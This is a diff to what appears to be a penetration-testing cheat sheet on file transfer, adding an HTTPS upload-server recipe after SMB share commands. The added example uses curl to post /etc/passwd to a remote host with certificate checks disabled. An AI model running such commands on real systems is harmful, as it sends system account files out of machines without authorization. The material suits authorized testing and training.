@@ -33,4 +33,14 @@ With password:<br>
 **Sender:** `python3 smbserver.py -username admin -password 8618 adminshare /home/hunter`<br>
 **Reciever:** `smbclient -U admin //192.168.0.107/adminshare` <br>
 
- 
+# Upload server
+
+1) Create openssl certificate:
+```bash
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+```
+2) Start upload server:
+```bash
+sudo python3 -m uploadserver 443 --server-certificate /location/server.pem
+```
+**Reciever:** `curl -X POST https://192.168.0.107/upload -F 'files=@/etc/passwd' --insecure` or browse web server to `/upload` location
